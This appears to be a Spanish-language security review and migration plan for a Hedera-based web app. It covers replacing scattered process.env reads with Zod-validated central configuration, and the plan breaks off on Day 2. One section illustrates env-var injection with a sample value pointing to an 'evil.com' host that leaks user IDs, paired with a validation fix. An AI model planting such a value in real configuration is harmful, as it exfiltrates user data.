# Análisis Crítico: Acceso Directo a Variables de Entorno

**Severidad:** 🔴 **CRÍTICA**
**Archivos Afectados:** 44 archivos
**Líneas de Código Problemáticas:** ~150+
**Esfuerzo de Corrección:** 3-5 días
**Prioridad:** Inmediata (Semana 1)

---

## 📋 Tabla de Contenidos

1. [Resumen Ejecutivo](#resumen-ejecutivo)
2. [Análisis Detallado del Problema](#análisis-detallado-del-problema)
3. [Inventario Completo de Violaciones](#inventario-completo-de-violaciones)
4. [Riesgos de Seguridad Específicos](#riesgos-de-seguridad-específicos)
5. [Solución Paso a Paso](#solución-paso-a-paso)
6. [Plan de Migración](#plan-de-migración)
7. [Prevención Futura](#prevención-futura)
8. [Casos de Borde y Excepciones](#casos-de-borde-y-excepciones)

---

## 📊 Resumen Ejecutivo

### El Problema

A pesar de tener un sistema robusto de configuración validada en `serverEnv.ts` usando Zod, **44 archivos** continúan accediendo directamente a `process.env.*` en lugar de usar la configuración centralizada y validada.

### Impacto

```typescript
// ❌ PROBLEMA ACTUAL (150+ ocurrencias)
const apiKey = process.env.MIRROR_NODE_API_KEY  // Sin validación, sin tipo, falla en runtime

// ✅ SOLUCIÓN CORRECTA
import { serverEnv } from '@/config/serverEnv'
const apiKey = serverEnv.mirrorNodeApiKey  // Validado, tipado, falla en startup
```

### Estadísticas

- **Total de accesos directos:** ~150 líneas
- **Archivos afectados:** 44
- **Tipos de variables accedidas:**
  - 🔐 Secretos (claves privadas, tokens): 28 accesos
  - 🔧 Configuración (IDs, URLs): 85 accesos
  - 🎛️ Flags de feature: 15 accesos
  - 📊 Configuración de entorno: 22 accesos

---

## 🔍 Análisis Detallado del Problema

### Arquitectura Actual vs Ideal

#### Estado Actual (Problemático)

```
┌─────────────────┐
│  .env.local     │
│  (no validado)  │
└────────┬────────┘
         │
         ├─────────────► src/services/hederaService.ts
         │                  process.env.DEPOSIT_WALLET_KEY ⚠️
         │
         ├─────────────► src/services/telegramService.ts
         │                  process.env.TELEGRAM_BOT_TOKEN ⚠️
         │
         ├─────────────► src/infrastructure/hedera/...
         │                  process.env.USDC_TOKEN_ID ⚠️
         │
         └─────────────► src/lib/jwt.ts
                           process.env.JWT_SECRET ⚠️

Problemas:
❌ Sin validación en startup
❌ Crashes en runtime (no en build)
❌ Sin type safety
❌ Difícil de testear
❌ Variables duplicadas
```

#### Estado Ideal (Solución)

```
┌─────────────────┐
│  .env.local     │
└────────┬────────┘
         │
         ▼
┌─────────────────────────┐
│  config/serverEnv.ts    │
│  ✅ Validación con Zod  │
│  ✅ Type safety          │
│  ✅ Fail fast            │
└────────┬────────────────┘
         │
         ├─────────────► src/services/*.ts
         │                  serverEnv.operators.deposit.privateKey ✅
         │
         ├─────────────► src/infrastructure/*.ts
         │                  serverEnv.tokens.usdc.tokenId ✅
         │
         └─────────────► src/lib/*.ts
                           serverEnv.jwtSecret ✅

Beneficios:
✅ Validación en startup
✅ Type safety completo
✅ Fácil de testear (mock config)
✅ Single source of truth
✅ Documentación automática
```

---

## 📁 Inventario Completo de Violaciones

### Categoría 1: Claves Privadas y Secretos (CRÍTICO) 🔐

**28 accesos directos a credenciales sensibles**

#### `src/services/hederaService.ts` (21 violaciones)

```typescript
// ❌ LÍNEAS 28-37: Decimals sin validación
private readonly HBAR_MULTIPLIER = Math.pow(10, parseInt(process.env.HBAR_DECIMALS ?? '8'))
private readonly USDC_MULTIPLIER = Math.pow(10, parseInt(process.env.USDC_DECIMALS ?? '6'))
private readonly HUSD_MULTIPLIER = Math.pow(10, parseInt(process.env.HUSD_DECIMALS ?? '3'))

// ❌ LÍNEAS 50-52: Operador sin validación
const operatorIdStr = process.env.OPERATOR_ID
const operatorKeyStr = process.env.OPERATOR_KEY
const topicIdStr = process.env.TOPIC_ID

// ❌ LÍNEAS 107-133: TODAS las wallets accedidas directamente
return {
    id: process.env.DEPOSIT_WALLET_ID ?? '',
    key: process.env.DEPOSIT_WALLET_KEY ?? '',  // 🚨 CLAVE PRIVADA
}
// ... y así con 6 wallets más
```

**Riesgo:**
- Si una variable falta, el código usa string vacío `''`
- Intentará usar una clave privada inválida
- Falla **después** de que el usuario hizo una transacción
- Pérdida potencial de fondos si falla a mitad de operación

**Solución:**

```typescript
// ✅ CORRECTO
import { serverEnv } from '@/config/serverEnv'

private readonly HBAR_MULTIPLIER = Math.pow(10, serverEnv.decimals.hbar)
private readonly USDC_MULTIPLIER = Math.pow(10, serverEnv.decimals.usdc)
private readonly HUSD_MULTIPLIER = Math.pow(10, serverEnv.decimals.husd)

// ✅ Operador validado
constructor() {
    // serverEnv ya validó que existen, si no, la app no arranca
    this.operatorId = AccountId.fromString(serverEnv.operators.deposit.accountId)
    this.operatorKey = PrivateKey.fromString(serverEnv.operators.deposit.privateKey)
}

// ✅ Wallets con type safety
private getWalletCredentials(walletType: 'deposit' | 'emissions' | ...) {
    switch (walletType) {
        case 'deposit':
            return serverEnv.operators.deposit  // Ya validado
        case 'emissions':
            return serverEnv.operators.emissions
        // ...
    }
}
```

---

#### `src/services/telegramService.ts` (2 violaciones)

```typescript
// ❌ LÍNEAS 39-40
const botToken = process.env.TELEGRAM_BOT_TOKEN
const chatId = process.env.TELEGRAM_CHAT_ID
```

**Problema Específico:**
```typescript
if (!botToken || !chatId) {
    logger.info('Telegram service disabled...')
    return  // ⚠️ Falla SILENCIOSAMENTE
}
```

Esto es peligroso porque:
1. No sabrás que las notificaciones fallan hasta que necesites una
2. En producción, podrías no enterarte de fraude/problemas
3. No hay forma de detectar si olvidaste configurar Telegram

**Solución:**

```typescript
// ✅ Opción A: Hacer Telegram obligatorio
// En serverEnv.ts
const envSchema = z.object({
    // ...
    TELEGRAM_BOT_TOKEN: z.string().min(10),
    TELEGRAM_CHAT_ID: z.string().min(5),
})

// En TelegramService
import { serverEnv } from '@/config/serverEnv'
constructor() {
    this.bot = new TelegramBot(serverEnv.telegram.botToken)
    this.chatId = serverEnv.telegram.chatId
    this.isEnabled = true
}

// ✅ Opción B: Hacer Telegram opcional pero con validación clara
const envSchema = z.object({
    TELEGRAM_BOT_TOKEN: z.string().optional(),
    TELEGRAM_CHAT_ID: z.string().optional(),
})

// Validar que ambos están o ambos faltan
if (env.TELEGRAM_BOT_TOKEN && !env.TELEGRAM_CHAT_ID) {
    throw new Error('TELEGRAM_BOT_TOKEN set but TELEGRAM_CHAT_ID missing')
}

export const serverEnv = {
    telegram: env.TELEGRAM_BOT_TOKEN ? {
        botToken: env.TELEGRAM_BOT_TOKEN,
        chatId: env.TELEGRAM_CHAT_ID!,
        enabled: true
    } : {
        enabled: false
    }
}
```

---

#### `src/lib/jwt.ts` (1 violación)

```typescript
// ❌ LÍNEA 6
const getJWTSecret = (): Uint8Array => {
    const secret = process.env.JWT_SECRET
    if (!secret) {
        throw new Error('JWT_SECRET environment variable is not defined')
    }
    return new TextEncoder().encode(secret)
}
```

**Problema:**
- Este error solo se lanza cuando alguien intenta autenticarse
- Si el servidor arranca sin `JWT_SECRET`, parece funcionar
- El primer usuario que intente login recibe un crash del servidor

**Escenario Real:**
```bash
# Deploy a producción sin JWT_SECRET
$ vercel deploy

# Todo parece OK, el servidor arranca
✅ Server running on port 3000

# Usuario intenta hacer login
POST /api/auth/verify
💥 500 Internal Server Error
   Error: JWT_SECRET environment variable is not defined

# 🚨 Todo el sistema de autenticación está caído
```

**Solución:**

```typescript
// ✅ CORRECTO - Ya está validado en serverEnv.ts
import { serverEnv } from '@/config/serverEnv'

const getJWTSecret = (): Uint8Array => {
    // No necesita validación, serverEnv garantiza que existe
    return new TextEncoder().encode(serverEnv.jwtSecret)
}

export async function createJWT(accountId: string): Promise<string> {
    const secret = getJWTSecret()  // Siempre será válido
    // ...
}
```

---

### Categoría 2: Configuración de Red/Tokens (ALTO) 🔧

**85 accesos a configuración crítica de blockchain**

#### `src/infrastructure/hedera/*.ts` (Multiple archivos)

```typescript
// ❌ HederaDepositService.ts:81-82
const usdcTokenId = process.env.USDC_TOKEN_ID
const husdTokenId = process.env.HUSD_TOKEN_ID

// ❌ HederaWithdrawalService.ts:56
const usdcTokenId = process.env.USDC_TOKEN_ID

// ❌ HederaMirrorNodeService.ts:46
const husdTokenId = process.env.HUSD_TOKEN_ID
```

**Problema de Duplicación:**
```typescript
// Este código se repite ~15 veces en diferentes archivos
const usdcTokenId = process.env.USDC_TOKEN_ID

// Si alguien cambia el USDC_TOKEN_ID en producción y olvida reiniciar
// algunos servicios podrían tener el ID viejo en memoria
```

**Riesgo de Seguridad:**
```typescript
// ❌ Si USDC_TOKEN_ID falta o es inválido
const usdcTokenId = process.env.USDC_TOKEN_ID  // undefined
TokenId.fromString(usdcTokenId)  // 💥 Crash DESPUÉS de recibir fondos del usuario

// Escenario:
// 1. Usuario envía 1000 USDC al protocolo ✅
// 2. Backend intenta mintear hUSD
// 3. 💥 Crash porque USDC_TOKEN_ID es undefined
// 4. Usuario perdió 1000 USDC, no recibió hUSD
```

**Solución:**

```typescript
// ✅ CORRECTO
import { serverEnv } from '@/config/serverEnv'

class HederaDepositService {
    private usdcTokenId: TokenId
    private husdTokenId: TokenId

    constructor() {
        // Validado en startup, una sola vez
        this.usdcTokenId = TokenId.fromString(serverEnv.tokens.usdc.tokenId)
        this.husdTokenId = TokenId.fromString(serverEnv.tokens.husd.tokenId)
    }

    async processDeposit() {
        // Usa las propiedades de clase, no re-parsea cada vez
        const transfer = new TransferTransaction()
            .addTokenTransfer(this.usdcTokenId, ...)
    }
}
```

---

#### Mirror Node URLs (12 violaciones)

```typescript
// ❌ Se repite en múltiples archivos
const mirrorUrl = process.env.TESTNET_MIRROR_NODE_ENDPOINT ??
    'https://testnet.mirrornode.hedera.com'
```

**Problemas:**
1. **Hardcoded fallback diferente en cada archivo**
   - Algunos usan `testnet.mirrornode.hedera.com`
   - Otros usan `testnet.hedera.validationcloud.io`
   - Inconsistencia = debugging imposible

2. **No considera mainnet**
   ```typescript
   // Este código SIEMPRE usa testnet
   const url = process.env.TESTNET_MIRROR_NODE_ENDPOINT ?? 'https://testnet...'
   // En mainnet, seguirá usando testnet! 🚨
   ```

**Solución:**

```typescript
// serverEnv.ts
export const serverEnv = {
    // ...
    hedera: {
        network: env.HEDERA_NETWORK === 'mainnet' ? 'mainnet' : 'testnet',
        mirrorNodeUrl: env.HEDERA_NETWORK === 'mainnet'
            ? env.MAINNET_MIRROR_NODE_ENDPOINT ?? 'https://mainnet-public.mirrornode.hedera.com'
            : env.TESTNET_MIRROR_NODE_ENDPOINT ?? 'https://testnet.mirrornode.hedera.com',
        mirrorNodeApiKey: env.MIRROR_NODE_API_KEY,
    }
}

// En servicios
import { serverEnv } from '@/config/serverEnv'

const response = await fetch(
    `${serverEnv.hedera.mirrorNodeUrl}/api/v1/accounts/${accountId}`,
    {
        headers: serverEnv.hedera.mirrorNodeApiKey
            ? { 'x-api-key': serverEnv.hedera.mirrorNodeApiKey }
            : {}
    }
)
```

---

### Categoría 3: Feature Flags y Configuración (MEDIO) 🎛️

#### `src/services/withdrawService.ts:262`

```typescript
// ❌ Feature flag sin validación
if (process.env.SKIP_WITHDRAW_LOCK_PERIOD === 'true') {
    // Salta el período de bloqueo de retiros
}
```

**Problema:**
- Typo en producción: `SKIP_WITHDRAW_LOCK_PERIOD=treu` → No se detecta
- El flag no está documentado en `.env.example`
- No hay logging cuando está activo
- Riesgo de seguridad si queda activo en producción

**Solución:**

```typescript
// serverEnv.ts
const envSchema = z.object({
    // ...
    // Feature flags (development only)
    SKIP_WITHDRAW_LOCK_PERIOD: z
        .enum(['true', 'false'])
        .optional()
        .default('false'),
})

export const serverEnv = {
    // ...
    features: {
        skipWithdrawLockPeriod: env.SKIP_WITHDRAW_LOCK_PERIOD === 'true',
    }
}

// Log warning si está activo
if (serverEnv.features.skipWithdrawLockPeriod) {
    logger.warn('⚠️ WITHDRAW LOCK PERIOD DISABLED - Development mode only!')
}

// En producción, forzar a false
if (serverEnv.isProduction && serverEnv.features.skipWithdrawLockPeriod) {
    throw new Error('SKIP_WITHDRAW_LOCK_PERIOD cannot be enabled in production')
}

// Uso
import { serverEnv } from '@/config/serverEnv'

if (serverEnv.features.skipWithdrawLockPeriod) {
    logger.warn('Skipping withdraw lock period (dev mode)')
}
```

---

#### `src/core/di/container.ts:70`

```typescript
// ❌ Decisión de implementación en runtime
const CacheImplementation = process.env.REDIS_URL
    ? RedisCacheService
    : InMemoryCacheService
```

**Problema:**
- No valida el formato de `REDIS_URL`
- Si el URL es inválido, Redis falla después
- No hay logging de qué implementación se usó

**Solución:**

```typescript
// serverEnv.ts
const envSchema = z.object({
    REDIS_URL: z.string().url().optional(),
})

export const serverEnv = {
    cache: {
        type: env.REDIS_URL ? 'redis' : 'memory',
        url: env.REDIS_URL,
    }
}

// container.ts
import { serverEnv } from '@/config/serverEnv'

logger.info('Initializing cache', { type: serverEnv.cache.type })

const CacheImplementation = serverEnv.cache.type === 'redis'
    ? RedisCacheService
    : InMemoryCacheService

if (serverEnv.cache.type === 'redis') {
    container.bind<ICacheService>(TYPES.CacheService)
        .toDynamicValue(() => new RedisCacheService({
            url: serverEnv.cache.url!  // Garantizado que existe
        }))
} else {
    logger.warn('Using in-memory cache - not suitable for production')
    container.bind<ICacheService>(TYPES.CacheService)
        .to(InMemoryCacheService)
}
```

---

### Categoría 4: Configuración de Logging/Debug (BAJO) 📊

#### `src/core/logging/PinoLogger.ts:12-13`

```typescript
// ❌ Acceso directo para configuración de logs
const isDevelopment = process.env.NODE_ENV === 'development'
const logLevel = (process.env.LOG_LEVEL as pino.Level) ?? 'info'
```

**Problema:**
- `LOG_LEVEL` no está validado contra valores válidos
- Typo: `LOG_LEVEL=debg` → Fallback silencioso a 'info'

**Solución:**

```typescript
// serverEnv.ts
const envSchema = z.object({
    NODE_ENV: z.enum(['development', 'production', 'test']).optional(),
    LOG_LEVEL: z.enum(['trace', 'debug', 'info', 'warn', 'error', 'fatal'])
        .optional()
        .default('info'),
})

export const serverEnv = {
    logging: {
        level: env.LOG_LEVEL,
        isDevelopment: env.NODE_ENV === 'development',
    }
}

// PinoLogger.ts
import { serverEnv } from '@/config/serverEnv'

const logger = pino({
    level: serverEnv.logging.level,
    transport: serverEnv.logging.isDevelopment ? {
        target: 'pino-pretty'
    } : undefined
})
```

---

## 🚨 Riesgos de Seguridad Específicos

### 1. Race Condition en Variables de Entorno

**Problema:**
```typescript
// Archivo A
const operatorKey = process.env.OPERATOR_KEY

// Archivo B (cargado después)
const operatorKey = process.env.OPERATOR_KEY

// Si entre A y B alguien hace:
delete process.env.OPERATOR_KEY

// Archivo B tendrá undefined, Archivo A tendrá la clave
```

**Solución:**
Usando `serverEnv`, todos leen del mismo objeto inmutable.

---

### 2. Type Confusion Attacks

```typescript
// ❌ Sin validación de tipo
const decimals = parseInt(process.env.USDC_DECIMALS ?? '6')

// Ataque: .env.local tiene
USDC_DECIMALS=1000000

// Resultado:
Math.pow(10, 1000000)  // 💥 Infinity
// Todos los cálculos monetarios dan resultados incorrectos
```

**Solución:**
```typescript
// serverEnv.ts con validación de rango
USDC_DECIMALS: z.string()
    .regex(/^\d+$/)
    .transform(Number)
    .refine(n => n >= 0 && n <= 18, 'Decimals must be between 0 and 18')
```

---

### 3. Injection via Environment Variables

```typescript
// ❌ PELIGRO: Si un env var se usa en construcción de URL
const apiUrl = process.env.EXTERNAL_API_URL
fetch(`${apiUrl}/users/${userId}`)

// Ataque: .env.local
EXTERNAL_API_URL=https://evil.com?steal=

// Resultado:
fetch('https://evil.com?steal=/users/12345')
// Filtra IDs de usuarios al atacante
```

**Solución:**
```typescript
// serverEnv.ts
EXTERNAL_API_URL: z.string()
    .url()
    .refine(url => {
        const parsed = new URL(url)
        return parsed.hostname.endsWith('.yourdomain.com')
    }, 'API URL must be from yourdomain.com')
```

---

### 4. Timing Attacks

```typescript
// ❌ Comparación no segura
const jwtSecret = process.env.JWT_SECRET

if (providedSecret === jwtSecret) {  // ⚠️ Timing attack
    // ...
}
```

**Correcto:**
```typescript
import crypto from 'crypto'

const isValid = crypto.timingSafeEqual(
    Buffer.from(providedSecret),
    Buffer.from(serverEnv.jwtSecret)
)
```

---

## 🛠️ Solución Paso a Paso

### Fase 1: Extender `serverEnv.ts` (Día 1)

```typescript
// src/config/serverEnv.ts

import { z } from 'zod'

const envSchema = z.object({
    // ==========================================
    // HEDERA CONFIGURATION
    // ==========================================

    // Network
    HEDERA_NETWORK: z.enum(['mainnet', 'testnet']).default('testnet'),
    USE_REAL_TESTNET: z.enum(['true', 'false']).optional().default('true'),

    // Operator (legacy)
    OPERATOR_ID: z.string().regex(/^\d+\.\d+\.\d+$/),
    OPERATOR_KEY: z.string().min(10),

    // Wallets - Deposit
    DEPOSIT_WALLET_ID: z.string().regex(/^\d+\.\d+\.\d+$/),
    DEPOSIT_WALLET_KEY: z.string().min(10),

    // Wallets - Withdrawals
    INSTANT_WITHDRAW_WALLET_ID: z.string().regex(/^\d+\.\d+\.\d+$/),
    INSTANT_WITHDRAW_WALLET_KEY: z.string().min(10),
    STANDARD_WITHDRAW_WALLET_ID: z.string().regex(/^\d+\.\d+\.\d+$/),
    STANDARD_WITHDRAW_WALLET_KEY: z.string().min(10),

    // Wallets - Treasury & Emissions
    TREASURY_ID: z.string().regex(/^\d+\.\d+\.\d+$/),
    TREASURY_KEY: z.string().min(10),
    EMISSIONS_ID: z.string().regex(/^\d+\.\d+\.\d+$/),
    EMISSIONS_KEY: z.string().min(10),

    // Wallets - Rate Publisher
    RATE_PUBLISHER_ID: z.string().regex(/^\d+\.\d+\.\d+$/),
    RATE_PUBLISHER_KEY: z.string().min(10),

    // Tokens
    USDC_TOKEN_ID: z.string().regex(/^\d+\.\d+\.\d+$/),
    HUSD_TOKEN_ID: z.string().regex(/^\d+\.\d+\.\d+$/),

    // Decimals
    USDC_DECIMALS: z.string().regex(/^\d+$/).transform(Number)
        .refine(n => n >= 0 && n <= 18).optional().default('6'),
    HUSD_DECIMALS: z.string().regex(/^\d+$/).transform(Number)
        .refine(n => n >= 0 && n <= 18).optional().default('3'),
    HBAR_DECIMALS: z.string().regex(/^\d+$/).transform(Number)
        .refine(n => n >= 0 && n <= 18).optional().default('8'),

    // Topics
    TOPIC_ID: z.string().regex(/^\d+\.\d+\.\d+$/),
    WITHDRAW_TOPIC_ID: z.string().regex(/^\d+\.\d+\.\d+$/).optional(),

    // Mirror Node
    MIRROR_NODE_API_KEY: z.string().optional(),
    TESTNET_MIRROR_NODE_ENDPOINT: z.string().url().optional(),
    MAINNET_MIRROR_NODE_ENDPOINT: z.string().url().optional(),

    // ==========================================
    // AUTHENTICATION & SECURITY
    // ==========================================

    JWT_SECRET: z.string().min(32),

    // ==========================================
    // EXTERNAL SERVICES
    // ==========================================

    // Supabase
    NEXT_PUBLIC_SUPABASE_URL: z.string().url(),
    NEXT_PUBLIC_SUPABASE_ANON_KEY: z.string().min(20),
    SUPABASE_SERVICE_ROLE_KEY: z.string().min(20),

    // Telegram (Optional)
    TELEGRAM_BOT_TOKEN: z.string().min(10).optional(),
    TELEGRAM_CHAT_ID: z.string().optional(),

    // SaucerSwap (Optional)
    SAUCERSWAP_API_URL: z.string().url().optional(),
    SAUCERSWAP_API_KEY: z.string().optional(),

    // Bonzo (Optional)
    BONZO_API_URL: z.string().url().optional(),

    // Validation Cloud (Optional)
    VALIDATION_CLOUD_API_KEY: z.string().optional(),
    VALIDATION_CLOUD_BASE_URL: z.string().url().optional(),

    // ==========================================
    // INFRASTRUCTURE
    // ==========================================

    // Redis (Optional)
    REDIS_URL: z.string().url().optional(),
    REDIS_HOST: z.string().optional(),
    REDIS_PORT: z.string().regex(/^\d+$/).optional(),
    REDIS_PASSWORD: z.string().optional(),
    REDIS_DB: z.string().regex(/^\d+$/).optional(),

    // ==========================================
    // APPLICATION CONFIGURATION
    // ==========================================

    NODE_ENV: z.enum(['development', 'production', 'test']).optional(),
    LOG_LEVEL: z.enum(['trace', 'debug', 'info', 'warn', 'error', 'fatal'])
        .optional().default('info'),

    // Feature Flags
    SKIP_WITHDRAW_LOCK_PERIOD: z.enum(['true', 'false']).optional(),

    // ==========================================
    // MONITORING
    // ==========================================

    NEXT_PUBLIC_SENTRY_DSN: z.string().url().optional(),
    SENTRY_DSN: z.string().url().optional(),
    SENTRY_ORG: z.string().optional(),
    SENTRY_PROJECT: z.string().optional(),
    SENTRY_AUTH_TOKEN: z.string().optional(),
})

// Validación cross-field
.refine(data => {
    // Si Telegram está configurado, ambos deben estar presentes
    const hasBotToken = !!data.TELEGRAM_BOT_TOKEN
    const hasChatId = !!data.TELEGRAM_CHAT_ID
    return hasBotToken === hasChatId
}, {
    message: 'TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID must both be set or both be empty',
    path: ['TELEGRAM_BOT_TOKEN']
})

// Parse and validate
const envResult = envSchema.safeParse(process.env)

if (!envResult.success) {
    console.error('❌ Invalid environment configuration:')
    console.error(envResult.error.flatten())
    throw new Error('Invalid environment configuration. See errors above.')
}

const env = envResult.data

// ==========================================
// EXPORTED CONFIGURATION
// ==========================================

export const serverEnv = {
    // Environment
    nodeEnv: env.NODE_ENV ?? 'development',
    isProduction: env.NODE_ENV === 'production',
    isDevelopment: env.NODE_ENV === 'development',

    // Hedera Network
    hedera: {
        network: env.HEDERA_NETWORK,
        useRealTestnet: env.USE_REAL_TESTNET === 'true',
        mirrorNodeUrl: env.HEDERA_NETWORK === 'mainnet'
            ? env.MAINNET_MIRROR_NODE_ENDPOINT ?? 'https://mainnet-public.mirrornode.hedera.com'
            : env.TESTNET_MIRROR_NODE_ENDPOINT ?? 'https://testnet.mirrornode.hedera.com',
        mirrorNodeApiKey: env.MIRROR_NODE_API_KEY,
    },

    // Operators/Wallets
    operators: {
        legacy: {
            accountId: env.OPERATOR_ID,
            privateKey: env.OPERATOR_KEY,
        },
        deposit: {
            accountId: env.DEPOSIT_WALLET_ID,
            privateKey: env.DEPOSIT_WALLET_KEY,
        },
        instantWithdraw: {
            accountId: env.INSTANT_WITHDRAW_WALLET_ID,
            privateKey: env.INSTANT_WITHDRAW_WALLET_KEY,
        },
        standardWithdraw: {
            accountId: env.STANDARD_WITHDRAW_WALLET_ID,
            privateKey: env.STANDARD_WITHDRAW_WALLET_KEY,
        },
        treasury: {
            accountId: env.TREASURY_ID,
            privateKey: env.TREASURY_KEY,
        },
        emissions: {
            accountId: env.EMISSIONS_ID,
            privateKey: env.EMISSIONS_KEY,
        },
        ratePublisher: {
            accountId: env.RATE_PUBLISHER_ID,
            privateKey: env.RATE_PUBLISHER_KEY,
        },
    },

    // Tokens
    tokens: {
        usdc: {
            tokenId: env.USDC_TOKEN_ID,
            decimals: env.USDC_DECIMALS,
        },
        husd: {
            tokenId: env.HUSD_TOKEN_ID,
            decimals: env.HUSD_DECIMALS,
        },
    },

    // Decimals
    decimals: {
        hbar: env.HBAR_DECIMALS,
        usdc: env.USDC_DECIMALS,
        husd: env.HUSD_DECIMALS,
    },

    // Topics
    topics: {
        main: env.TOPIC_ID,
        withdraw: env.WITHDRAW_TOPIC_ID,
    },

    // Authentication
    jwtSecret: env.JWT_SECRET,

    // Supabase
    supabase: {
        url: env.NEXT_PUBLIC_SUPABASE_URL,
        anonKey: env.NEXT_PUBLIC_SUPABASE_ANON_KEY,
        serviceRoleKey: env.SUPABASE_SERVICE_ROLE_KEY,
    },

    // Telegram
    telegram: env.TELEGRAM_BOT_TOKEN ? {
        botToken: env.TELEGRAM_BOT_TOKEN,
        chatId: env.TELEGRAM_CHAT_ID!,
        enabled: true,
    } : {
        enabled: false,
    },

    // External APIs
    externalApis: {
        saucerSwap: env.SAUCERSWAP_API_URL ? {
            url: env.SAUCERSWAP_API_URL,
            apiKey: env.SAUCERSWAP_API_KEY,
        } : undefined,
        bonzo: env.BONZO_API_URL ? {
            url: env.BONZO_API_URL,
        } : undefined,
        validationCloud: env.VALIDATION_CLOUD_API_KEY ? {
            apiKey: env.VALIDATION_CLOUD_API_KEY,
            baseUrl: env.VALIDATION_CLOUD_BASE_URL ?? 'https://api.validationcloud.io',
        } : undefined,
    },

    // Cache
    cache: {
        type: env.REDIS_URL ? 'redis' as const : 'memory' as const,
        redis: env.REDIS_URL ? {
            url: env.REDIS_URL,
            host: env.REDIS_HOST,
            port: env.REDIS_PORT ? parseInt(env.REDIS_PORT) : undefined,
            password: env.REDIS_PASSWORD,
            db: env.REDIS_DB ? parseInt(env.REDIS_DB) : undefined,
        } : undefined,
    },

    // Logging
    logging: {
        level: env.LOG_LEVEL,
    },

    // Feature Flags
    features: {
        skipWithdrawLockPeriod: env.SKIP_WITHDRAW_LOCK_PERIOD === 'true',
    },

    // Monitoring
    sentry: env.NEXT_PUBLIC_SENTRY_DSN ? {
        dsn: env.NEXT_PUBLIC_SENTRY_DSN,
        org: env.SENTRY_ORG,
        project: env.SENTRY_PROJECT,
        authToken: env.SENTRY_AUTH_TOKEN,
        enabled: true,
    } : {
        enabled: false,
    },
} as const

// Type export
export type ServerEnv = typeof serverEnv

// Validation warnings
if (serverEnv.isProduction) {
    if (serverEnv.cache.type === 'memory') {
        console.warn('⚠️ WARNING: Using in-memory cache in production. Use Redis for multi-instance deployments.')
    }

    if (serverEnv.features.skipWithdrawLockPeriod) {
        throw new Error('🚨 SECURITY: SKIP_WITHDRAW_LOCK_PERIOD cannot be enabled in production')
    }

    if (!serverEnv.sentry.enabled) {
        console.warn('⚠️ WARNING: Sentry monitoring is disabled in production')
    }
}

// Log configuration summary (non-sensitive)
console.log('✅ Environment configuration loaded successfully')
console.log(`   Environment: ${serverEnv.nodeEnv}`)
console.log(`   Hedera Network: ${serverEnv.hedera.network}`)
console.log(`   Cache: ${serverEnv.cache.type}`)
console.log(`   Telegram: ${serverEnv.telegram.enabled ? 'enabled' : 'disabled'}`)
console.log(`   Sentry: ${serverEnv.sentry.enabled ? 'enabled' : 'disabled'}`)
```

---

### Fase 2: Migrar Servicios (Días 2-3)

#### Ejemplo 1: `src/services/hederaService.ts`

```typescript
// ❌ ANTES (líneas 26-37, 50-52, 107-133)
import { createScopedLogger } from '@/lib/logger'
const logger = createScopedLogger('service:hederaService')

export class HederaService {
    private readonly HBAR_MULTIPLIER = Math.pow(10, parseInt(process.env.HBAR_DECIMALS ?? '8'))
    private readonly USDC_MULTIPLIER = Math.pow(10, parseInt(process.env.USDC_DECIMALS ?? '6'))
    private readonly HUSD_MULTIPLIER = Math.pow(10, parseInt(process.env.HUSD_DECIMALS ?? '3'))

    constructor() {
        const operatorIdStr = process.env.OPERATOR_ID
        const operatorKeyStr = process.env.OPERATOR_KEY
        // ... muchos más process.env
    }
}

// ✅ DESPUÉS
import { createScopedLogger } from '@/lib/logger'
import { serverEnv } from '@/config/serverEnv'

const logger = createScopedLogger('service:hederaService')

export class HederaService {
    // Constantes calculadas una vez
    private readonly HBAR_MULTIPLIER = Math.pow(10, serverEnv.decimals.hbar)
    private readonly USDC_MULTIPLIER = Math.pow(10, serverEnv.decimals.usdc)
    private readonly HUSD_MULTIPLIER = Math.pow(10, serverEnv.decimals.husd)

    private client: Client
    private operatorId: AccountId
    private operatorKey: PrivateKey
    private topicId: TopicId

    constructor() {
        // Todo está validado, falla en startup si falta algo
        this.operatorId = AccountId.fromString(serverEnv.operators.legacy.accountId)
        this.operatorKey = PrivateKey.fromString(serverEnv.operators.legacy.privateKey)
        this.topicId = TopicId.fromString(serverEnv.topics.main)

        // Cliente basado en configuración
        this.client = serverEnv.hedera.network === 'mainnet'
            ? Client.forMainnet()
            : Client.forTestnet()

        this.client.setOperator(this.operatorId, this.operatorKey)

        logger.info('Hedera client initialized', {
            network: serverEnv.hedera.network,
            operator: this.operatorId.toString(),
        })
    }

    private getWalletCredentials(walletType: keyof typeof serverEnv.operators) {
        return serverEnv.operators[walletType]
    }
}
```

#### Ejemplo 2: `src/services/telegramService.ts`

```typescript
// ❌ ANTES
export class TelegramService {
    constructor() {
        const botToken = process.env.TELEGRAM_BOT_TOKEN
        const chatId = process.env.TELEGRAM_CHAT_ID

        if (!botToken || !chatId) {
            logger.info('Telegram disabled...')
            return
        }

        this.bot = new TelegramBot(botToken)
        this.chatId = chatId
    }
}

// ✅ DESPUÉS
import { serverEnv } from '@/config/serverEnv'

export class TelegramService {
    private bot: TelegramBot | null = null
    private chatId: string | null = null
    private isEnabled: boolean

    constructor() {
        this.isEnabled = serverEnv.telegram.enabled

        if (!this.isEnabled) {
            logger.info('Telegram notifications disabled')
            return
        }

        this.bot = new TelegramBot(serverEnv.telegram.botToken)
        this.chatId = serverEnv.telegram.chatId

        logger.info('Telegram service initialized successfully')
    }

    async sendWithdrawNotification(notification: WithdrawNotification) {
        if (!this.isEnabled || !this.bot || !this.chatId) {
            logger.debug('Telegram notification skipped (service disabled)')
            return
        }

        // Enviar notificación
        await this.bot.sendMessage(this.chatId, message)
    }
}
```

---

### Fase 3: ESLint Rule (Día 4)

```javascript
// eslint.config.mjs
export default [
    {
        rules: {
            // Prohibir acceso directo a process.env
            'no-restricted-syntax': [
                'error',
                {
                    selector: "MemberExpression[object.name='process'][property.name='env']",
                    message: 'Direct access to process.env is not allowed. Use serverEnv from @/config/serverEnv instead.',
                },
            ],
        },
    },
    {
        // Excepciones para archivos de configuración
        files: [
            'src/config/serverEnv.ts',
            'src/lib/env-validator.ts',
            'next.config.ts',
            'sentry.*.config.ts',
        ],
        rules: {
            'no-restricted-syntax': 'off',
        },
    },
]
```

---

## 📅 Plan de Migración

### Día 1: Preparación
- [ ] Extender `serverEnv.ts` con todas las variables
- [ ] Actualizar `.env.example` con documentación
- [ ] Crear tests para `serverEnv.ts`

### Día 2: Migración Crítica (Seguridad)
- [ ] Migrar `src/lib/jwt.ts`
- [ ] Migrar `src/services/hederaService.ts`
